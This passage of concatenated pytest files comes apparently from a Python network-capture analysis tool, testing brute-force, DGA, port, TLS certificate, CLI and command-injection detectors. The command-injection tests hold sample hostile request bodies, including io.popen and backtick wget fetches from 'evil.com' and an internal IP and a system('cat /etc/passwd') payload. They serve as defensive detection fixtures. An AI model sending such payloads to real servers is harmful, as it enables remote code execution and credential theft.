    assert findings[0].evidence["unique_src_ports"] == 230
    assert findings[0].confidence >= 0.9


# ---------- ниже порога ----------

def test_below_min_flows():
    """5 flows — меньше порога (20), не finding."""
    state = CaptureState()
    for i in range(5):
        _add_flow(
            state,
            "10.0.1.50", "192.168.1.12", 50000 + i, 80,
            packets=2,
        )

    findings = BruteForceDetector().run(state, Config())

    assert findings == []


# ---------- длинная сессия ----------

def test_long_session_not_detected():
    """Один flow с 300 пакетами — не brute force (это сессия)."""
    state = CaptureState()
    _add_flow(
        state,
        "10.0.1.247", "192.168.1.12", 39566, 22,
        packets=331, bytes_sent=300894,
    )

    findings = BruteForceDetector().run(state, Config())

    assert findings == []


def test_long_sessions_multiple_flows_not_detected():
    """20 flows, но avg_packets > 20 — не brute force."""
    state = CaptureState()
    for i in range(20):
        _add_flow(
            state,
            "10.0.1.50", "192.168.1.12", 50000 + i, 80,
            packets=50,  # avg_packets = 50 > 20 (порог)
        )

    findings = BruteForceDetector().run(state, Config())

    assert findings == []


# ---------- port scan ----------

def test_port_scan_not_detected():
    """100 flows к РАЗНЫМ dst_port по 1 flow — это scan, не brute force."""
    state = CaptureState()
    for i in range(100):
        _add_flow(
            state,
            "10.0.1.50", "192.168.1.12", 50000 + i, 1000 + i,
            packets=2,
        )

    findings = BruteForceDetector().run(state, Config())

    # каждая пара (src, dst, dst_port) имеет 1 flow — ниже порога
    assert findings == []


# ---------- кастомные пороги ----------

def test_custom_thresholds():
    """Понижаем пороги → срабатывает на 5 flow'ах."""
    state = CaptureState()
    for i in range(5):
        _add_flow(
            state,
            "10.0.1.50", "192.168.1.12", 50000 + i, 80,
            packets=2,
        )

    # Config — frozen dataclass, поля передаются в конструктор
    config = Config(
        brute_force_min_flows=5,
        brute_force_min_unique_src_ports=5,
        brute_force_max_avg_packets=3,
    )

    findings = BruteForceDetector().run(state, config)

    assert len(findings) == 1
    assert findings[0].evidence["flow_count"] == 5


# ---------- агрегация по нескольким целям ----------

def test_separate_targets_give_separate_findings():
    """Два разных dst_port — два отдельных finding'а."""
    state = CaptureState()

    for i in range(30):
        _add_flow(state, "10.0.1.50", "192.168.1.12", 50000 + i, 80, packets=2)
    for i in range(30):
        _add_flow(state, "10.0.1.50", "192.168.1.12", 60000 + i, 21, packets=2)

    findings = BruteForceDetector().run(state, Config())

    assert len(findings) == 2
    values = sorted(f.value for f in findings)
    assert values == [
        "10.0.1.50 -> 192.168.1.12:21",
        "10.0.1.50 -> 192.168.1.12:80",
    ]


# ---------- игнор udp / без порта ----------

def test_udp_ignored():
    """UDP flows не участвуют в brute-force — только TCP."""
    state = CaptureState()
    for i in range(50):
        key = FlowKey(proto="udp", src_ip="10.0.1.50",
                      dst_ip="192.168.1.12", src_port=50000 + i, dst_port=53)
        state.flows[key] = FlowStats(packets=1, bytes_sent=50,
                                     first_ts=1.0, last_ts=1.0)

    findings = BruteForceDetector().run(state, Config())

    assert findings == []


def test_flow_without_dst_port_ignored():
    """Flow без dst_port (например, other-протокол) — пропускается."""
    state = CaptureState()
    for i in range(50):
        key = FlowKey(proto="other", src_ip="10.0.1.50",
                      dst_ip="192.168.1.12", src_port=None, dst_port=None)
        state.flows[key] = FlowStats(packets=1, bytes_sent=50,
                                     first_ts=1.0, last_ts=1.0)

    findings = BruteForceDetector().run(state, Config())

    assert findings == []

# FILE: tests/test_cert_rules.py
# ==========================================
"""Тесты правил sni_cert_mismatch / self_signed_cert / expired_cert."""
from paradox.contradictions.base import Fact
from paradox.contradictions.rules.i_sni_cert_mismatch import (
    SniCertMismatchRule,
    _match_one,
)
from paradox.contradictions.rules.j_self_signed_cert import (
    SelfSignedCertRule,
)
from paradox.contradictions.rules.k_expired_cert import (
    ExpiredCertRule,
)


def _cert_fact(
    src="192.168.1.5",
    sni="example.com",
    subject_cn="example.com",
    issuer_cn="Test CA",
    is_self_signed=False,
    not_after="2026-12-31T23:59:59",
    not_after_ts=1798761599.0,  # ~2026-12-31
    san_dns=None,
    ts=1700000000.0,           # ~2023-11-14
    dst_ip="1.2.3.4",
    dst_port=443,
):
    return Fact(
        source="tls_cert",
        subject=src,
        predicate="tls_cert",
        value=subject_cn or "",
        ts=ts,
        confidence=0.9,
        evidence={
            "sni": sni,
            "subject_cn": subject_cn,
            "issuer_cn": issuer_cn,
            "is_self_signed": is_self_signed,
            "not_before": "2024-01-01T00:00:00",
            "not_after": not_after,
            "not_after_ts": not_after_ts,
            "san_dns": san_dns or [],
            "san_ips": [],
            "dst_ip": dst_ip,
            "dst_port": dst_port,
        },
    )


# === wildcard matching ===

def test_match_exact():
    assert _match_one("example.com", "example.com") is True


def test_match_case_insensitive():
    assert _match_one("Example.COM", "example.com") is True


def test_match_wildcard_single_level():
    assert _match_one("a.example.com", "*.example.com") is True


def test_match_wildcard_two_levels_no():
    # *.example.com НЕ matches a.b.example.com (RFC 6125)
    assert _match_one("a.b.example.com", "*.example.com") is False


def test_match_different_domain():
    assert _match_one("attacker.com", "example.com") is False


def test_match_empty():
    assert _match_one("", "example.com") is False
    assert _match_one("example.com", "") is False


# === SniCertMismatchRule ===

def test_sni_cert_mismatch_triggers():
    f = _cert_fact(sni="evil.example", subject_cn="legit.example",
                   san_dns=["legit.example"])
    res = SniCertMismatchRule().find_contradictions([f])
    assert len(res) == 1
    assert res[0].subject == "192.168.1.5"
    assert res[0].severity == "medium"


def test_sni_cert_match_no_contradiction():
    f = _cert_fact(sni="example.com", subject_cn="example.com")
    assert SniCertMismatchRule().find_contradictions([f]) == []


def test_sni_cert_san_match_no_contradiction():
    f = _cert_fact(sni="www.example.com", subject_cn="example.com",
                   san_dns=["www.example.com", "api.example.com"])
    assert SniCertMismatchRule().find_contradictions([f]) == []


def test_sni_cert_wildcard_match():
    f = _cert_fact(sni="a.example.com", subject_cn="*.example.com")
    assert SniCertMismatchRule().find_contradictions([f]) == []


def test_sni_cert_no_sni_skipped():
    f = _cert_fact(sni="", subject_cn="example.com")
    assert SniCertMismatchRule().find_contradictions([f]) == []


def test_sni_cert_no_names_skipped():
    f = _cert_fact(sni="example.com", subject_cn=None, san_dns=[])
    assert SniCertMismatchRule().find_contradictions([f]) == []


# === SelfSignedCertRule ===

def test_self_signed_triggers():
    f = _cert_fact(is_self_signed=True, subject_cn="evil.example",
                   issuer_cn="evil.example")
    res = SelfSignedCertRule().find_contradictions([f])
    assert len(res) == 1
    assert res[0].severity == "medium"


def test_not_self_signed_no_contradiction():
    f = _cert_fact(is_self_signed=False)
    assert SelfSignedCertRule().find_contradictions([f]) == []


# === ExpiredCertRule ===

def test_expired_cert_triggers():
    # not_after_ts < first_ts flow
    f = _cert_fact(
        not_after_ts=1500000000.0,   # ~2017-07
        ts=1700000000.0,             # ~2023-11
    )
    res = ExpiredCertRule().find_contradictions([f])
    assert len(res) == 1
    assert res[0].severity == "low"


def test_not_expired_no_contradiction():
    f = _cert_fact(
        not_after_ts=1798761599.0,   # ~2026-12
        ts=1700000000.0,             # ~2023-11
    )
    assert ExpiredCertRule().find_contradictions([f]) == []


def test_expired_no_timestamps_skipped():
    f = _cert_fact(not_after_ts=0.0)
    assert ExpiredCertRule().find_contradictions([f]) == []

# FILE: tests/test_cli.py
# ==========================================
import pytest
from pathlib import Path
from unittest.mock import patch
from paradox.cli import main


@pytest.fixture
def mock_pcap(tmp_path):
    p = tmp_path / "test.pcap"
    p.write_text("fake pcap content")
    return p


@patch("paradox.cli.run_pipeline")
@patch("paradox.cli.write_json")
@patch("paradox.cli.write_markdown")
def test_cli_main_success(mock_md, mock_json, mock_pipeline, mock_pcap, capsys):
    # Мокаем возврат пайплайна
    mock_pipeline.return_value = {
        "summary": {"packets": 100, "unique_dns_queries": 5, "nxdomain_count": 0, "flows": 10, "findings": 2,
                    "extractor_errors": {}},
        "provenance": {"pcap_path": str(mock_pcap)}
    }

    # Запускаем CLI от лица пользователя
    main([str(mock_pcap)])

    # Проверяем, что пайплайн вызвался
    assert mock_pipeline.called
    assert mock_json.called
    assert mock_md.called

    # Проверяем вывод в консоль
    captured = capsys.readouterr()
    assert "packets:            100" in captured.out
    assert "findings:           2" in captured.out


def test_cli_file_not_found(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["non_existent_file.pcap"])
    assert exc.value.code == 2
    assert "file not found" in capsys.readouterr().err

# FILE: tests/test_cli_deep.py
# ==========================================
"""Углублённые тесты CLI: _safe_stem, _resolve_output, --enrich."""
from dataclasses import dataclass
from pathlib import Path
from unittest.mock import patch

import pytest

from paradox.cli import _safe_stem, _resolve_output


@dataclass
class _FakeCfg:
    output_dir: Path


def test_safe_stem_replaces_dots():
    """Точки заменяются на подчёркивания."""
    p = Path("snort_log.1425892283.pcap")
    assert _safe_stem(p) == "snort_log_1425892283_pcap"


def test_safe_stem_truncates_to_80():
    """Очень длинное имя обрезается до 80 символов."""
    p = Path("a" * 100 + ".pcap")
    result = _safe_stem(p)
    assert len(result) <= 80


def test_resolve_output_no_arg(tmp_path):
    """out_arg=None → config.output_dir / <stem>.report.json."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()

    out = _resolve_output(None, pcap, cfg)

    assert out == tmp_path / "capture_pcap.report.json"
    assert out.parent == tmp_path


def test_resolve_output_existing_dir(tmp_path):
    """out_arg — существующая директория → dir/<stem>.report.json."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_dir = tmp_path / "out"
    out_dir.mkdir()

    out = _resolve_output(out_dir, pcap, cfg)

    assert out == out_dir / "capture_pcap.report.json"


def test_resolve_output_trailing_slash_lost_by_path(tmp_path):
    """Path() теряет trailing slash → treated as file, добавляется .json.

    Известное ограничение: CLI использует type=Path, и к моменту
    _resolve_output слеш уже потерян, поэтому hint не срабатывает.
    Реальное поведение: создаётся файл `newdir.json`, а не `newdir/cap...`.
    """
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_arg = Path(str(tmp_path / "newdir") + "/")

    out = _resolve_output(out_arg, pcap, cfg)

    # Факт: получаем файл newdir.json, а не папку
    assert out.name == "newdir.json"
    assert out.parent == tmp_path


def test_resolve_output_existing_dir_trailing_slash(tmp_path):
    """Если директория уже существует — она и используется как папка."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_dir = tmp_path / "existing"
    out_dir.mkdir()

    out = _resolve_output(out_dir, pcap, cfg)

    assert out.parent == out_dir
    assert out.name == "capture_pcap.report.json"


def test_resolve_output_file_no_ext(tmp_path):
    """out_arg — файл без расширения → .json добавляется."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_file = tmp_path / "myreport"

    out = _resolve_output(out_file, pcap, cfg)

    assert out == tmp_path / "myreport.json"


def test_resolve_output_file_with_ext(tmp_path):
    """out_arg — файл с расширением → как есть."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_file = tmp_path / "myreport.txt"

    out = _resolve_output(out_file, pcap, cfg)

    assert out == out_file


def test_resolve_output_file_double_ext(tmp_path):
    """out_arg — foo.bar.baz → как есть (не трогаем)."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_file = tmp_path / "foo.bar.baz"

    out = _resolve_output(out_file, pcap, cfg)

    assert out == out_file


def test_resolve_output_creates_parent(tmp_path):
    """Родительская папка создаётся автоматически."""
    cfg = _FakeCfg(output_dir=tmp_path)
    pcap = tmp_path / "capture.pcap"
    pcap.touch()
    out_file = tmp_path / "deep" / "nested" / "dir" / "report.json"

    out = _resolve_output(out_file, pcap, cfg)

    assert out.parent.is_dir()


# ---- --enrich -------------------------------------------------------------


def test_cli_enrich_flag_success(tmp_path):
    """--enrich вызывает enrich_findings и добавляет stats в report."""
    from paradox.cli import main

    pcap = tmp_path / "cap.pcap"
    pcap.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)
    out = tmp_path / "out.json"

    fake_report = {
        "summary": {
            "packets": 10, "unique_dns_queries": 0,
            "nxdomain_count": 0, "flows": 1, "findings": 0,
            "extractor_errors": {},
        },
        "provenance": {"pcap_path": str(pcap)},
        "findings": [],
    }

    with patch("paradox.cli.run_pipeline", return_value=fake_report), \
         patch("paradox.cli.write_json"), \
         patch("paradox.cli.write_markdown"), \
         patch("paradox.integrations.pipeline.enrich_findings",
               return_value={"iocs_total": 5, "iocs_enriched": 3,
                             "cache_hits": 1, "provider_calls": 2,
                             "errors": 0}) as mock_enrich:
        main([str(pcap), "-o", str(out), "--enrich"])

    mock_enrich.assert_called_once()
    assert "enrichment_stats" in fake_report
    assert fake_report["enrichment_stats"]["iocs_total"] == 5


def test_cli_enrich_flag_exception_handled(tmp_path):
    """--enrich: если enrich_findings падает, CLI не валится."""
    from paradox.cli import main

    pcap = tmp_path / "cap.pcap"
    pcap.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)
    out = tmp_path / "out.json"

    fake_report = {
        "summary": {
            "packets": 1, "unique_dns_queries": 0,
            "nxdomain_count": 0, "flows": 0, "findings": 0,
            "extractor_errors": {},
        },
        "provenance": {"pcap_path": str(pcap)},
        "findings": [],
    }

    with patch("paradox.cli.run_pipeline", return_value=fake_report), \
         patch("paradox.cli.write_json"), \
         patch("paradox.cli.write_markdown"), \
         patch("paradox.integrations.pipeline.enrich_findings",
               side_effect=RuntimeError("network down")):
        # Не должен падать
        main([str(pcap), "-o", str(out), "--enrich"])

    assert "enrichment_stats" in fake_report
    assert "error" in fake_report["enrichment_stats"]

# FILE: tests/test_cli_interactive.py
# ==========================================
"""Тесты интерактивного ввода пути в CLI."""
from pathlib import Path
from unittest.mock import patch

import pytest

from paradox.cli import _ask_pcap_path


def test_ask_pcap_path_valid_file(tmp_path):
    """Пользователь ввёл путь к существующему файлу — возвращаем."""
    p = tmp_path / "test.pcap"
    p.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)

    with patch("builtins.input", return_value=str(p)):
        result = _ask_pcap_path()

    assert result == p.expanduser()


def test_ask_pcap_path_strips_quotes(tmp_path):
    """Путь в кавычках — кавычки снимаются."""
    p = tmp_path / "test.pcap"
    p.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)

    with patch("builtins.input", return_value=f'"{p}"'):
        result = _ask_pcap_path()

    assert result == p.expanduser()


def test_ask_pcap_path_retry_on_missing(tmp_path, capsys):
    """Несуществующий путь → повторный ввод."""
    p = tmp_path / "real.pcap"
    p.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)

    # Два вызова: первый — несуществующий, второй — валидный
    with patch("builtins.input", side_effect=[str(tmp_path / "nope.pcap"), str(p)]):
        result = _ask_pcap_path()

    assert result == p.expanduser()
    out = capsys.readouterr().out
    assert "Не найдено" in out or "nope.pcap" in out


def test_ask_pcap_path_retry_on_empty(tmp_path, capsys):
    """Пустой ввод → повтор."""
    p = tmp_path / "real.pcap"
    p.write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 20)

    with patch("builtins.input", side_effect=["", "   ", str(p)]):
        result = _ask_pcap_path()

    assert result == p.expanduser()


# ==========================================
# FILE: tests/test_command_injection.py
# ==========================================
"""
Тесты CommandInjectionDetector.

Не требует ни pipeline, ни reassembly — создаём state.http_objects
напрямую через объекты HttpObject.
"""
from paradox.config import Config
from paradox.detectors.command_injection import CommandInjectionDetector
from paradox.http_object import HttpObject
from paradox.models import CaptureState, FlowKey


def _state(*requests):
    """
    requests: list of (src_ip, uri, body_bytes).
    Строит минимальный CaptureState с http_objects.
    """
    state = CaptureState()
    objs = []
    for i, (src_ip, uri, body) in enumerate(requests):
        key = FlowKey(
            proto="tcp", src_ip=src_ip, dst_ip="10.0.0.1",
            src_port=50000 + i, dst_port=80,
        )
        obj = HttpObject(
            kind="request",
            method="POST",
            uri=uri,
            headers={"host": "target.local"},
            body=body,
            body_size=len(body),
        )
        objs.append((key, obj))
    state.http_objects = objs
    return state


def test_command_injection_lua_popen():
    """io.popen — high-паттерн, confidence 0.9."""
    body = (
        b"username=anonymous%00]]%0dlocal+h+%3d+io.popen"
        b'("wget http://10.0.1.152/x")%0d'
    )
    state = _state(("10.0.1.50", "/loginok.html", body))
    findings = CommandInjectionDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "command_injection"
    assert findings[0].confidence == 0.9
    assert "io.popen" in findings[0].evidence["matched_patterns"]


def test_command_injection_php_system():
    """system( в body — high."""
    body = b"cmd=;system('cat /etc/passwd');"
    state = _state(("10.0.1.50", "/upload.php", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.9
    assert "system(" in findings[0].evidence["matched_patterns"]


def test_command_injection_shell_backtick():
    """Backticks + wget — 2 medium, confidence 0.75."""
    body = b"q=`wget http://evil.com/s.sh`"
    state = _state(("10.0.1.50", "/api", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.75


def test_command_injection_single_medium_not_flagged():
    """Один medium — не finding (шумно)."""
    body = b"search=whoami"
    state = _state(("10.0.1.50", "/search", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_normal_login():
    """Нормальный логин — нет finding."""
    body = b"username=admin&password=secret123"
    state = _state(("10.0.1.50", "/login", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_empty_body():
    """Пустой body — нет finding."""
    state = _state(("10.0.1.50", "/api/health", b""))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_response_ignored():
    """Response не проверяется — только request."""
    from paradox.models import FlowKey
    state = CaptureState()
    key = FlowKey(
        proto="tcp", src_ip="10.0.0.1", dst_ip="10.0.1.50",
        src_port=80, dst_port=50000,
    )
    obj = HttpObject(
        kind="response",
        status_code=200,
        body=b"system('ls')",  # в response это не команда
    )
    state.http_objects = [(key, obj)]
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_aggregates_same_uri():
    """5 POST на /loginok.html с io.popen — один finding."""
    body = b"u=x%00io.popen('id')"
    requests = [("10.0.1.50", "/loginok.html", body)] * 5
    state = _state(*requests)
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["count"] == 5


def test_command_injection_separate_uris():
    """Разные URI — разные findings."""
    b1 = b"x=io.popen('id')"
    b2 = b"y=system('ls')"
    state = _state(
        ("10.0.1.50", "/a.php", b1),
        ("10.0.1.50", "/b.php", b2),
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 2


def test_command_injection_empty_state():
    """Пустой state — не падает."""
    findings = CommandInjectionDetector().run(CaptureState(), Config())
    assert findings == []

# FILE: tests/test_confidence_explainer.py
# ==========================================
"""Тесты Confidence explainer (P0.4)."""
import pytest
from paradox.models import Finding

def test_confidence_reasons_default():
    """По умолчанию список причин пуст."""
    f = Finding(
        type="test", 
        value="test_value", 
        confidence=0.5
    )
    assert hasattr(f, "confidence_reasons")
    assert f.confidence_reasons == []

def test_confidence_reasons_add():
    """Можно добавлять причины."""
    f = Finding(
        type="dga", 
        value="DGA domain", 
        confidence=0.8
    )
    f.confidence_reasons.append("Высокая энтропия")
    f.confidence_reasons.append("Много NXDOMAIN")

    assert len(f.confidence_reasons) == 2
    assert "Высокая энтропия" in f.confidence_reasons

def test_confidence_reasons_to_dict():
    """Причины попадают в сериализованный JSON."""
    f = Finding(
        type="dga", 
        value="DGA domain", 
        confidence=0.8
    )
    f.confidence_reasons.append("Причина 1")

    d = f.to_dict()
    assert "confidence_reasons" in d
    assert d["confidence_reasons"] == ["Причина 1"]


# ==========================================
# FILE: tests/test_config_builder.py
# ==========================================
"""Тесты сборки Config с overrides.

Проверяют семантику, от которой зависит RunView._run_analysis:
после overrides производные поля пересчитаны, валидация выполнена,
output_dir создан, пользовательский dga_allowlist не затёрт.
"""
import pytest

from paradox_gui.config_builder import build_config_with_overrides


def test_default_config_when_no_overrides():
    cfg = build_config_with_overrides({})
    # Дефолтная сборка dga_allowlist прошла:
    assert "trycloudflare.com" in cfg.dga_allowlist  # cloud_tunnel
    assert "ip-api.com" in cfg.dga_allowlist         # ip_check


def test_cloud_tunnel_override_flows_into_dga_allowlist():
    cfg = build_config_with_overrides({
        "cloud_tunnel_domains": frozenset({"example.test"}),
    })
    assert "example.test" in cfg.dga_allowlist


def test_user_dga_allowlist_wins_over_rebuild():
    custom = frozenset({"keep.me", "and.me"})
    cfg = build_config_with_overrides({"dga_allowlist": custom})
    assert cfg.dga_allowlist == custom


def test_output_dir_created_after_override(tmp_path):
    target = tmp_path / "reports_override"
    cfg = build_config_with_overrides({"output_dir": target})
    assert target.is_dir()
    assert cfg.output_dir == target


def test_invalid_value_raises():
    with pytest.raises(ValueError):
        build_config_with_overrides({"nxdomain_burst_threshold": -1})


def test_brute_force_excluded_ports_rebuilt_from_dc_service_ports():
    cfg = build_config_with_overrides({
        "dc_service_ports": frozenset({88, 389}),
    })
    assert cfg.brute_force_excluded_ports == frozenset({88, 389})

# FILE: tests/test_contradiction_help.py
# ==========================================
"""Тесты описаний противоречий."""
from paradox_gui.contradiction_help import (
    CONTRADICTION_HELP,
    get_contradiction_help,
)
from paradox_gui.views.settings_view import _CONTRADICTIONS


def test_all_contradictions_have_help():
    missing = [k for k, _ in _CONTRADICTIONS if k not in CONTRADICTION_HELP]
    assert not missing, f"нет описаний для: {sorted(missing)}"


def test_no_extra_help_keys():
    known = {k for k, _ in _CONTRADICTIONS}
    extra = set(CONTRADICTION_HELP) - known
    assert not extra, f"лишние ключи: {sorted(extra)}"


def test_help_texts_not_empty():
    empty = [k for k, v in CONTRADICTION_HELP.items() if not v.strip()]
    assert not empty, f"пустые описания: {empty}"


def test_get_help_fallback():
    assert get_contradiction_help("nonexistent") == ""


def test_count_is_twelve():
    assert len(CONTRADICTION_HELP) == 12


# ==========================================
# FILE: tests/test_counterfactual.py
# ==========================================
"""Тесты Counterfactual (what-if) анализа."""
from paradox.analyzers.counterfactual import evaluate_what_if


def test_what_if_empty():
    assert evaluate_what_if({})["original_count"] == 0


def test_what_if_exclude_ip():
    report = {
        "findings": [
            {"type": "port_scan", "src_ip": "10.0.0.5", "dst_ip": "10.0.0.10", "value": "scan"},
            {"type": "dga", "src_ip": "10.0.0.10", "dst_ip": "8.8.8.8", "value": "bad.com"},
        ]
    }

    res = evaluate_what_if(report, exclude_ips=["10.0.0.5"])

    assert res["original_count"] == 2
    assert res["removed_count"] == 1
    assert res["remaining_count"] == 1
    assert res["removed_findings"][0]["type"] == "port_scan"
    assert res["remaining_findings"][0]["type"] == "dga"


def test_what_if_exclude_domain():
    report = {
        "findings": [
            {"type": "dga", "src_ip": "10.0.0.10", "dst_ip": "8.8.8.8", "value": "bad.com"},
            {"type": "dga", "src_ip": "10.0.0.11", "dst_ip": "8.8.8.8", "value": "good.com", "evidence": {"domain": "good.com"}},
        ]
    }

    res = evaluate_what_if(report, exclude_domains=["bad.com"])

    assert res["original_count"] == 2
    assert res["removed_count"] == 1
    assert res["remaining_count"] == 1
    assert res["remaining_findings"][0]["value"] == "good.com"


def test_what_if_combined():
    report = {
        "findings": [
            {"type": "port_scan", "src_ip": "10.0.0.5", "value": "scan"},
            {"type": "dga", "value": "bad.com"},
            {"type": "beaconing", "src_ip": "10.0.0.10", "value": "good.com"},
        ]
    }

    res = evaluate_what_if(report, exclude_ips=["10.0.0.5"], exclude_domains=["bad.com"])

    assert res["original_count"] == 3
    assert res["removed_count"] == 2
    assert res["remaining_count"] == 1
    assert res["remaining_findings"][0]["type"] == "beaconing"


# ==========================================
# FILE: tests/test_detector_help.py
# ==========================================
"""Тесты описаний детекторов."""
from paradox_gui.detector_help import DETECTOR_HELP, get_detector_help
from paradox_gui.views.settings_view import _DETECTORS


def test_all_detectors_have_help():
    missing = [k for k, _ in _DETECTORS if k not in DETECTOR_HELP]
    assert not missing, f"нет описаний для: {sorted(missing)}"


def test_no_extra_help_keys():
    known = {k for k, _ in _DETECTORS}
    extra = set(DETECTOR_HELP) - known
    assert not extra, f"лишние ключи: {sorted(extra)}"


def test_help_texts_not_empty():
    empty = [k for k, v in DETECTOR_HELP.items() if not v.strip()]
    assert not empty, f"пустые описания: {empty}"


def test_get_detector_help_fallback():
    assert get_detector_help("nonexistent_key") == ""


def test_help_and_settings_are_in_sync():
    """_DETECTORS (settings_view) и DETECTOR_HELP (help) должны быть синхронны.

    Ловит две ошибки:
      - добавили детектор в GUI — забыли описание;
      - добавили описание — забыли детектор.
    """
    settings_keys = {k for k, _ in _DETECTORS}
    help_keys = set(DETECTOR_HELP)

    missing_in_help = settings_keys - help_keys
    missing_in_settings = help_keys - settings_keys

    assert not missing_in_help, (
        f"нет описаний для: {sorted(missing_in_help)}"
    )
    assert not missing_in_settings, (
        f"описания без детектора: {sorted(missing_in_settings)}"
    )

# FILE: tests/test_detectors.py

"""
Unit-тесты детекторов.

Без scapy, без pcap — только CaptureState руками.
Это принципиально: детектор — чистая функция над CaptureState,
и его поведение можно проверить за миллисекунды.

Запуск:
    pytest tests/ -v
"""

from paradox.config import Config
from paradox.detectors.cloud_tunnel import CloudTunnelDetector
from paradox.detectors.dga import DGADetector
from paradox.detectors.ip_check_service import IPCheckServiceDetector
from paradox.detectors.nxdomain_burst import NXDOMAINBurstDetector
from paradox.detectors.sni_mismatch import SNIMismatchDetector
from paradox.detectors.suspicious_port import SuspiciousPortDetector
from paradox.detectors.typosquatting import TyposquattingDetector
from paradox.detectors.typosquatting import levenshtein
from paradox.models import CaptureState, FlowKey, FlowStats


# ---------- DGADetector ----------

def test_dga_detects_high_entropy_domain():
    state = CaptureState()
    state.dns_queries["kq3jf9zxqp1mwv7n.ru"] = 5

    findings = DGADetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "dga_domain"
    assert findings[0].value == "kq3jf9zxqp1mwv7n.ru"
    assert findings[0].confidence > 0.6


def test_dga_ignores_normal_domain():
    state = CaptureState()
    state.dns_queries["google.com"] = 10

    findings = DGADetector().run(state, Config())

    assert findings == []


def test_dga_ignores_allowlisted_domain():
    state = CaptureState()
    state.dns_queries["some-long-random-name.amazonaws.com"] = 1

    findings = DGADetector().run(state, Config())

    assert findings == []


def test_dga_ignores_cloud_tunnel_domain():
    """Регрессия: cloud tunnel поддомены не должны ловиться как DGA."""
    state = CaptureState()
    state.dns_queries["varying-rentals-calgary-predict.trycloudflare.com"] = 1

    findings = DGADetector().run(state, Config())

    assert findings == []


def test_dga_ignores_short_label():
    state = CaptureState()
    state.dns_queries["xk3j.ru"] = 1

    findings = DGADetector().run(state, Config())

    assert findings == []


def test_dga_ignores_label_with_hyphen():
    """Регрессия с реального pcap: safebrowsing-cache.google.com
    не должен ловиться как DGA, несмотря на высокую энтропию."""
    state = CaptureState()
    state.dns_queries["safebrowsing-cache.google.com"] = 294

    findings = DGADetector().run(state, Config())

    assert findings == []


def test_dga_still_detects_no_hyphen_dga():
    """Гипотетический DGA без дефисов всё ещё ловится."""
    state = CaptureState()
    state.dns_queries["kq3jf9zxqp1mwv7n.ru"] = 1

    findings = DGADetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "dga_domain"


# ---------- SuspiciousPortDetector ----------

def test_suspicious_port_detects_external_4444():
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="203.0.113.66",
        src_port=53000, dst_port=4444,
    )
    state.flows[key] = FlowStats(packets=3, bytes_sent=180)

    findings = SuspiciousPortDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "suspicious_port"
    assert findings[0].value == "203.0.113.66:4444"
    assert findings[0].evidence["flow_count"] == 1


def test_suspicious_port_ignores_internal():
    """474 flow'а к 192.168.1.12:21 — это внутренний FTP, не сигнал."""
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.0.5", dst_ip="192.168.1.12",
        src_port=54000, dst_port=21,
    )
    state.flows[key] = FlowStats(packets=3, bytes_sent=180)

    findings = SuspiciousPortDetector().run(state, Config())

    assert findings == []


def test_suspicious_port_ignores_normal_port():
    state = CaptureState()
    key = FlowKey(
        proto="tcp",
        src_ip="192.168.1.100", dst_ip="142.250.185.78",
        src_port=52000, dst_port=443,
    )
    state.flows[key] = FlowStats(packets=3, bytes_sent=120)

    findings = SuspiciousPortDetector().run(state, Config())

    assert findings == []


def test_suspicious_port_ignores_no_port():
    state = CaptureState()
    key = FlowKey(
        proto="other",
        src_ip="192.168.1.100", dst_ip="203.0.113.66",
        src_port=None, dst_port=None,
    )
    state.flows[key] = FlowStats(packets=1, bytes_sent=60)

    findings = SuspiciousPortDetector().run(state, Config())

    assert findings == []


def test_suspicious_port_aggregates_same_dst():
    """Много flow'ов к одной паре dst_ip:dst_port → один finding."""
    state = CaptureState()
    for sport in (54000, 54001, 54002):
        key = FlowKey(
            proto="tcp",
            src_ip="192.168.1.100", dst_ip="203.0.113.66",
            src_port=sport, dst_port=4444,
        )
        state.flows[key] = FlowStats(packets=2, bytes_sent=100)

    findings = SuspiciousPortDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].value == "203.0.113.66:4444"
    assert findings[0].evidence["flow_count"] == 3


def test_suspicious_port_separate_dst():
    """Разные dst_ip → разные findings."""
    state = CaptureState()
    for dst in ("203.0.113.66", "203.0.113.77"):
        key = FlowKey(
            proto="tcp",
            src_ip="192.168.1.100", dst_ip=dst,
            src_port=54000, dst_port=4444,
        )
